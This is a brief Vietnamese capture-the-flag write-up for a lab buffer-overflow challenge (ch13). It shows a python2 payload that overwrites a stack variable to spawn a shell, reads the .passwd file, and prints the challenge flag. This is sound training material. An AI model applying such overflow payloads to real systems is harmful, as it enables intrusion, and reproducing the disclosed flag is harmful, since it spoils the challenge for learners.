# Source

[Source](./ch13.c)
[Binary](./ch13)

# Solve

- Ở thử thách này, cần ghi đè biến __check__ bằng cách truyền giá trị vào __buf__ để khiến giá trị của `__check__ = "0xdeadbeaf"`
- Payload là: `python2 -c "print 'A'*40 + '\xef\xbe\xad\xde'" | ./ch13`

```bash
app-systeme-ch13@challenge02:~$ python2 -c "print 'A'*40 + '\xef\xbe\xad\xde'" | ./ch13

[buf]: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAﾭ�
[check] 0xdeadbeef
Yeah dude! You win!
Opening your shell...
Shell closed! Bye.
app-systeme-ch13@challenge02:~$
```
- Tuy nhiên không thể kiểm soát shell trong file này, phải truyền vào cách khác. Đây là payload để có thể kiểm soát được shell bash:
`cat <(python2 -c "print 'A'*40 + '\xef\xbe\xad\xde\x00\x00'") - |./ch13`

```bash
app-systeme-ch13@challenge02:~$ cat <(python2 -c "print 'A'*40 + '\xef\xbe\xad\xde\x00\x00'") - |./ch13

[buf]: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAﾭ�
[check] 0xdeadbeef
Yeah dude! You win!
Opening your shell...
cat .passwd
1w4ntm0r3pr0np1s
```
- Vậy Flag là `1w4ntm0r3pr0np1s`

### 🚩Flag: `1w4ntm0r3pr0np1s`